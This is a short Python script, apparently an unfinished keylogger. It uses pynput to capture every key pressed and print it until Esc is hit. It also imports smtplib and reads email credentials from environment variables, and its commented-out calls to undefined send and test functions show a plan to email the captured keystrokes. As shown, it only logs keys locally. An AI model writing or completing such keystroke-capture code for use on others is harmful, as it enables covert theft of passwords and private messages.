from pynput import keyboard
import smtplib
import os
import enum
from enum import Enum
from email.message import EmailMessage

email = os.environ.get("EMAIL_USER")
passw = os.environ.get("EMAIL_PASS")
palabra = []
text = ""
item = ""

# Collect events until released
def read():
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release,
    ) as listener:
        listener.join()


def on_press(key):
    # palabra.append(key.char)

    global text
    if isinstance(key, Enum):
        print(str(key))
    else:
        print(key.char)




def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener mp

        return False



def main():
    read()
 #   test(text)
#   send(text)
 #   to_array(text)


if __name__ == "__main__":
    main()

